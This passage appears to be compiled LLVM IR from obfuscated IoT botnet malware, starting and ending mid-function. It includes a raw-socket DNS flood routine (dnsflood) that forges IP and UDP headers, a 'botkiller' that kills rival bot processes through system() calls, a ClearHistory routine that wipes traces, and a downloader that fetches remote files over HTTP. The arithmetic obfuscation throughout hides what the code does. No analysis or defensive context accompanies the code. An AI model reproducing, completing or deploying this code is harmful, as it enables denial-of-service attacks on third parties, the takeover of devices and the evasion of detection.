  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 2
  store i16 %127, i16* %129, align 2
  %130 = call i32 @rand_cmwc()
  %131 = call i32 @htonl(i32 %130) #13
  %132 = trunc i32 %131 to i16
  %133 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 3
  store i16 %132, i16* %134, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 4
  store i16 0, i16* %136, align 2
  %137 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 5
  store i8 64, i8* %138, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 6
  store i8 17, i8* %140, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 7
  store i16 0, i16* %142, align 2
  %143 = load i8*, i8** %5, align 8
  %144 = call i32 @inet_addr(i8* %143) #2
  %145 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 8
  store i32 %144, i32* %146, align 4
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %148 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 9
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %153 = bitcast i8* %152 to i16*
  %154 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 2
  %156 = load i16, i16* %155, align 2
  %157 = zext i16 %156 to i32
  %158 = call zeroext i16 @csum(i16* %153, i32 %157)
  %159 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 7
  store i16 %158, i16* %160, align 2
  %161 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %162 = getelementptr inbounds i8, i8* %161, i64 20
  %163 = bitcast i8* %162 to %struct.udphdr*
  store %struct.udphdr* %163, %struct.udphdr** %19, align 8
  %164 = load i32, i32* %6, align 4
  %165 = trunc i32 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #13
  %167 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.3* %168 to %struct.anon.4*
  %170 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %169, i32 0, i32 0
  store i16 %166, i16* %170, align 2
  %171 = call zeroext i16 @htons(i16 zeroext 53) #13
  %172 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.3* %173 to %struct.anon.4*
  %175 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %174, i32 0, i32 1
  store i16 %171, i16* %175, align 2
  %176 = load i8*, i8** %11, align 8
  %177 = call i64 @strlen(i8* %176) #10
  %178 = add i64 %177, -2346569047654889060
  %179 = add i64 %178, 1
  %180 = sub i64 %179, -2346569047654889060
  %181 = add i64 %177, 1
  %182 = sub i64 0, %180
  %183 = sub i64 20, %182
  %184 = add i64 20, %180
  %185 = sub i64 %183, 8541518246281647991
  %186 = add i64 %185, 4
  %187 = add i64 %186, 8541518246281647991
  %188 = add i64 %183, 4
  %189 = trunc i64 %187 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #13
  %191 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %192 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.3* %192 to %struct.anon.4*
  %194 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %193, i32 0, i32 2
  store i16 %190, i16* %194, align 2
  %195 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.3* %196 to %struct.anon.4*
  %198 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %197, i32 0, i32 3
  store i16 0, i16* %198, align 2
  %199 = load i8*, i8** %5, align 8
  %200 = call i32 @inet_addr(i8* %199) #2
  %201 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 0
  store i32 %200, i32* %201, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 4
  %205 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 1
  store i32 %204, i32* %205, align 4
  %206 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 2
  store i8 0, i8* %206, align 4
  %207 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 3
  store i8 17, i8* %207, align 1
  %208 = load i8*, i8** %11, align 8
  %209 = call i64 @strlen(i8* %208) #10
  %210 = sub i64 %209, 4778044124063644309
  %211 = add i64 %210, 1
  %212 = add i64 %211, 4778044124063644309
  %213 = add i64 %209, 1
  %214 = add i64 20, -2107867218576941175
  %215 = add i64 %214, %212
  %216 = sub i64 %215, -2107867218576941175
  %217 = add i64 20, %212
  %218 = add i64 %216, -2001623666116334947
  %219 = add i64 %218, 4
  %220 = sub i64 %219, -2001623666116334947
  %221 = add i64 %216, 4
  %222 = trunc i64 %220 to i16
  %223 = call zeroext i16 @htons(i16 zeroext %222) #13
  %224 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 4
  store i16 %223, i16* %224, align 2
  %225 = load i8*, i8** %11, align 8
  %226 = call i64 @strlen(i8* %225) #10
  %227 = sub i64 0, 1
  %228 = sub i64 %226, %227
  %229 = add i64 %226, 1
  %230 = sub i64 0, %228
  %231 = sub i64 32, %230
  %232 = add i64 32, %228
  %233 = sub i64 0, %231
  %234 = sub i64 0, 4
  %235 = add i64 %233, %234
  %236 = sub i64 0, %235
  %237 = add i64 %231, 4
  %238 = trunc i64 %236 to i32
  store i32 %238, i32* %21, align 4
  %239 = load i32, i32* %21, align 4
  %240 = sext i32 %239 to i64
  %241 = call noalias i8* @malloc(i64 %240) #2
  store i8* %241, i8** %16, align 8
  %242 = load i8*, i8** %16, align 8
  %243 = bitcast %struct.ps_hdr* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %242, i8* %243, i64 12, i32 1, i1 false)
  %244 = load i8*, i8** %16, align 8
  %245 = getelementptr inbounds i8, i8* %244, i64 12
  %246 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %247 = bitcast %struct.udphdr* %246 to i8*
  %248 = load i8*, i8** %11, align 8
  %249 = call i64 @strlen(i8* %248) #10
  %250 = sub i64 0, 1
  %251 = sub i64 %249, %250
  %252 = add i64 %249, 1
  %253 = add i64 20, 517392058221887322
  %254 = add i64 %253, %251
  %255 = sub i64 %254, 517392058221887322
  %256 = add i64 20, %251
  %257 = sub i64 0, 4
  %258 = sub i64 %255, %257
  %259 = add i64 %255, 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %245, i8* %247, i64 %258, i32 1, i1 false)
  %260 = load i8*, i8** %16, align 8
  %261 = bitcast i8* %260 to i16*
  %262 = load i32, i32* %21, align 4
  %263 = call zeroext i16 @csum(i16* %261, i32 %262)
  %264 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %265 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.3* %265 to %struct.anon.4*
  %267 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %266, i32 0, i32 3
  store i16 %263, i16* %267, align 2
  %268 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %268, i32* %22, align 4
  %269 = load i32, i32* %22, align 4
  %270 = icmp eq i32 %269, -1
  br i1 %270, label %271, label %272

; <label>:271:                                    ; preds = %4
  br label %288

; <label>:272:                                    ; preds = %4
  %273 = load i32, i32* %22, align 4
  %274 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %275 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 2
  %277 = load i16, i16* %276, align 2
  %278 = zext i16 %277 to i64
  %279 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %280 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %280, %struct.sockaddr** %279, align 8
  %281 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %282 = load %struct.sockaddr*, %struct.sockaddr** %281, align 8
  %283 = call i64 @sendto(i32 %273, i8* %274, i64 %278, i32 0, %struct.sockaddr* %282, i32 16)
  br label %284

; <label>:284:                                    ; preds = %272
  %285 = load i8*, i8** %16, align 8
  call void @free(i8* %285) #2
  %286 = load i32, i32* %22, align 4
  %287 = call i32 @close(i32 %286)
  br label %288

; <label>:288:                                    ; preds = %284, %271
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dnsflood(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %2, align 8
  %11 = call i32 @listFork()
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %1
  ret void

; <label>:14:                                     ; preds = %1
  %15 = load i8*, i8** %2, align 8
  %16 = bitcast i8* %15 to %struct.thread_data*
  store %struct.thread_data* %16, %struct.thread_data** %3, align 8
  %17 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %18 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %17, i32 0, i32 1
  %19 = load i8*, i8** %18, align 8
  store i8* %19, i8** %4, align 8
  %20 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %21 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %20, i32 0, i32 2
  %22 = load i32, i32* %21, align 8
  store i32 %22, i32* %5, align 4
  %23 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %24 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %23, i32 0, i32 4
  %25 = load i32, i32* %24, align 8
  store i32 %25, i32* %6, align 4
  %26 = call i64 @time(i64* null) #2
  %27 = call i32 @getpid() #2
  %28 = sext i32 %27 to i64
  %29 = xor i64 %26, -1
  %30 = and i64 %28, %29
  %31 = xor i64 %28, -1
  %32 = and i64 %26, %31
  %33 = or i64 %30, %32
  %34 = xor i64 %26, %28
  %35 = trunc i64 %33 to i32
  call void @init_rand(i32 %35)
  store i32 0, i32* %8, align 4
  %36 = call i64 @time(i64* null) #2
  %37 = load i32, i32* %6, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %36, -4685297503236373378
  %40 = add i64 %39, %38
  %41 = add i64 %40, -4685297503236373378
  %42 = add nsw i64 %36, %38
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %9, align 4
  br label %44

; <label>:44:                                     ; preds = %108, %14
  %45 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %45, %struct._IO_FILE** %10, align 8
  br label %46

; <label>:46:                                     ; preds = %107, %44
  %47 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %49 = call i8* @fgets(i8* %47, i32 100, %struct._IO_FILE* %48)
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %108

; <label>:51:                                     ; preds = %46
  %52 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %53 = call i64 @strlen(i8* %52) #10
  %54 = sub i64 %53, -195432158413118213
  %55 = sub i64 %54, 1
  %56 = add i64 %55, -195432158413118213
  %57 = sub i64 %53, 1
  %58 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %56
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 10
  br i1 %61, label %73, label %62

; <label>:62:                                     ; preds = %51
  %63 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #10
  %65 = sub i64 %64, -2440404607704374048
  %66 = sub i64 %65, 1
  %67 = add i64 %66, -2440404607704374048
  %68 = sub i64 %64, 1
  %69 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %67
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp eq i32 %71, 13
  br i1 %72, label %73, label %81

; <label>:73:                                     ; preds = %62, %51
  %74 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %75 = call i64 @strlen(i8* %74) #10
  %76 = sub i64 %75, 5504900012683806725
  %77 = sub i64 %76, 1
  %78 = add i64 %77, 5504900012683806725
  %79 = sub i64 %75, 1
  %80 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %78
  store i8 0, i8* %80, align 1
  br label %81

; <label>:81:                                     ; preds = %73, %62
  %82 = load i8*, i8** %4, align 8
  %83 = load i32, i32* %5, align 4
  %84 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  call void @dns_send(i8* %82, i32 %83, i8* %84, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i32 0, i32 0))
  %85 = load volatile i32, i32* @pps, align 4
  %86 = sub i32 %85, 1302235529
  %87 = add i32 %86, 1
  %88 = add i32 %87, 1302235529
  %89 = add i32 %85, 1
  store volatile i32 %88, i32* @pps, align 4
  %90 = load i32, i32* %8, align 4
  %91 = load volatile i32, i32* @limiter, align 4
  %92 = icmp sge i32 %90, %91
  br i1 %92, label %93, label %96

; <label>:93:                                     ; preds = %81
  store i32 0, i32* %8, align 4
  %94 = load volatile i32, i32* @sleeptime, align 4
  %95 = call i32 @usleep(i32 %94)
  br label %96

; <label>:96:                                     ; preds = %93, %81
  %97 = load i32, i32* %8, align 4
  %98 = add i32 %97, 1798042484
  %99 = add i32 %98, 1
  %100 = sub i32 %99, 1798042484
  %101 = add nsw i32 %97, 1
  store i32 %100, i32* %8, align 4
  %102 = call i64 @time(i64* null) #2
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = icmp sgt i64 %102, %104
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %96
  call void @exit(i32 0) #14
  unreachable

; <label>:107:                                    ; preds = %96
  br label %46

; <label>:108:                                    ; preds = %46
  %109 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %110 = call i32 @fclose(%struct._IO_FILE* %109)
  br label %44
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

; <label>:3:                                      ; preds = %36, %0
  store i32 0, i32* %1, align 4
  br label %4

; <label>:4:                                      ; preds = %30, %3
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  br i1 %6, label %7, label %36

; <label>:7:                                      ; preds = %4
  %8 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* %8, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i32 0, i32 0)) #2
  %10 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %11 = load i32, i32* %1, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strcat(i8* %10, i8* %14) #2
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %17 = call i32 @system(i8* %16)
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* %1, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcat(i8* %20, i8* %24) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strcat(i8* %26, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0)) #2
  %28 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %29 = call i32 @system(i8* %28)
  br label %30

; <label>:30:                                     ; preds = %7
  %31 = load i32, i32* %1, align 4
  %32 = sub i32 %31, 232116592
  %33 = add i32 %32, 1
  %34 = add i32 %33, 232116592
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %1, align 4
  br label %4

; <label>:36:                                     ; preds = %4
  %37 = call i32 @sleep(i32 5)
  br label %3
                                                  ; No predecessors!
  ret void
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @binsBins() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %1, align 4
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %0
  %5 = load i8*, i8** @rekdevice, align 8
  %6 = call i32 @system(i8* %5)
  %7 = call i32 @sleep(i32 20)
  br label %11

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %1, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i32 %9)
  br label %11

; <label>:11:                                     ; preds = %8, %4
  ret void
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @download(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i64, align 8
  %11 = alloca [1024 x i8], align 16
  %12 = alloca %struct._IO_FILE*, align 8
  %13 = alloca [4096 x i8], align 16
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %19, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %2
  store i32 3, i32* %3, align 4
  br label %215

; <label>:22:                                     ; preds = %2
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @strncmp(i8* %23, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i32 0, i32 0), i64 7) #10
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %31, label %26

; <label>:26:                                     ; preds = %22
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 7
  %30 = call i8* @strcpy(i8* %27, i8* %29) #2
  br label %35

; <label>:31:                                     ; preds = %22
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %33 = load i8*, i8** %4, align 8
  %34 = call i8* @strcpy(i8* %32, i8* %33) #2
  br label %35

; <label>:35:                                     ; preds = %31, %26
  store i32 0, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %52, %35
  %37 = load i32, i32* %7, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %40 = call i64 @strlen(i8* %39) #10
  %41 = icmp ult i64 %38, %40
  br i1 %41, label %42, label %49

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp ne i32 %47, 47
  br label %49

; <label>:49:                                     ; preds = %42, %36
  %50 = phi i1 [ false, %36 ], [ %48, %42 ]
  br i1 %50, label %51, label %59

; <label>:51:                                     ; preds = %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %7, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %7, align 4
  br label %36

; <label>:59:                                     ; preds = %49
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %61
  store i8 0, i8* %62, align 1
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %63, align 4
  %64 = call zeroext i16 @htons(i16 zeroext 80) #13
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %64, i16* %65, align 2
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %67 = call i32 @inet_addr(i8* %66) #2
  %68 = zext i32 %67 to i64
  store i64 %68, i64* %10, align 8
  %69 = icmp eq i64 %68, -1
  br i1 %69, label %70, label %87

; <label>:70:                                     ; preds = %59
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %72 = call %struct.hostent* @gethostbyname(i8* %71)
  store %struct.hostent* %72, %struct.hostent** %14, align 8
  %73 = icmp eq %struct.hostent* %72, null
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %70
  store i32 2, i32* %3, align 4
  br label %215

; <label>:75:                                     ; preds = %70
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %77 = bitcast %struct.in_addr* %76 to i8*
  %78 = load %struct.hostent*, %struct.hostent** %14, align 8
  %79 = getelementptr inbounds %struct.hostent, %struct.hostent* %78, i32 0, i32 4
  %80 = load i8**, i8*** %79, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 0
  %82 = load i8*, i8** %81, align 8
  %83 = load %struct.hostent*, %struct.hostent** %14, align 8
  %84 = getelementptr inbounds %struct.hostent, %struct.hostent* %83, i32 0, i32 3
  %85 = load i32, i32* %84, align 4
  %86 = sext i32 %85 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %77, i8* %82, i64 %86, i32 1, i1 false)
  br label %92

; <label>:87:                                     ; preds = %59
  %88 = load i64, i64* %10, align 8
  %89 = trunc i64 %88 to i32
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  store i32 %89, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %87, %75
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %94 = bitcast [8 x i8]* %93 to i8*
  call void @llvm.memset.p0i8.i64(i8* %94, i8 0, i64 8, i32 4, i1 false)
  %95 = load i32, i32* %6, align 4
  %96 = bitcast %union.__CONST_SOCKADDR_ARG* %15 to %struct.sockaddr**
  %97 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %97, %struct.sockaddr** %96, align 8
  %98 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %15, i32 0, i32 0
  %99 = load %struct.sockaddr*, %struct.sockaddr** %98, align 8
  %100 = call i32 @connect(i32 %95, %struct.sockaddr* %99, i32 16)
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %92
  store i32 1, i32* %3, align 4
  br label %215

; <label>:103:                                    ; preds = %92
  %104 = load i32, i32* %6, align 4
  %105 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %106 = load i32, i32* %7, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %111 = call i32 (i32, i8*, ...) @sockprintf(i32 %104, i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i32 0, i32 0), i8* %109, i8* %110)
  %112 = load i8*, i8** %5, align 8
  %113 = call %struct._IO_FILE* @fopen(i8* %112, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i32 0, i32 0))
  store %struct._IO_FILE* %113, %struct._IO_FILE** %12, align 8
  br label %114

; <label>:114:                                    ; preds = %173, %103
  %115 = load i32, i32* %6, align 4
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %117 = call i64 @recv(i32 %115, i8* %116, i64 4096, i32 0)
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %16, align 4
  %119 = icmp sle i32 %118, 0
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %114
  br label %174

; <label>:121:                                    ; preds = %114
  %122 = load i32, i32* %16, align 4
  %123 = icmp slt i32 %122, 4096
  br i1 %123, label %124, label %128

; <label>:124:                                    ; preds = %121
  %125 = load i32, i32* %16, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %126
  store i8 0, i8* %127, align 1
  br label %128

; <label>:128:                                    ; preds = %124, %121
  store i32 0, i32* %8, align 4
  br label %129

; <label>:129:                                    ; preds = %166, %128
  %130 = load i32, i32* %8, align 4
  %131 = load i32, i32* %16, align 4
  %132 = icmp slt i32 %130, %131
  br i1 %132, label %133, label %173

; <label>:133:                                    ; preds = %129
  %134 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = call i32 @strncmp(i8* %137, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i32 0, i32 0), i64 4) #10
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %165, label %140

; <label>:140:                                    ; preds = %133
  %141 = load i32, i32* %8, align 4
  %142 = sub i32 0, %141
  %143 = sub i32 0, 4
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add nsw i32 %141, 4
  store i32 %145, i32* %8, align 4
  br label %147

; <label>:147:                                    ; preds = %159, %140
  %148 = load i32, i32* %8, align 4
  %149 = load i32, i32* %16, align 4
  %150 = icmp slt i32 %148, %149
  br i1 %150, label %151, label %164

; <label>:151:                                    ; preds = %147
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = sext i8 %155 to i32
  %157 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %158 = call i32 @fputc(i32 %156, %struct._IO_FILE* %157)
  br label %159

; <label>:159:                                    ; preds = %151
  %160 = load i32, i32* %8, align 4
  %161 = sub i32 0, 1
  %162 = sub i32 %160, %161
  %163 = add nsw i32 %160, 1
  store i32 %162, i32* %8, align 4
  br label %147

; <label>:164:                                    ; preds = %147
  br label %175

; <label>:165:                                    ; preds = %133
  br label %166

; <label>:166:                                    ; preds = %165
